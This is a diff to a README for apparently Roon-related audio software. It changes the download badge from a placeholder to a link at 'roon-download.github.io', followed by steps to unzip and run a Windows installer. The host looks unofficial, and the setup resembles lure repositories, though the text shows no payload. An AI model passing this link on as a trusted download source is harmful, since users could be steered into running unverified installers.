@@ -8,7 +8,7 @@ With support for **bit-perfect playback, multi-room synchronization, and Roon Re
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-indigo?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-indigo?style=for-the-badge)](https://roon-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
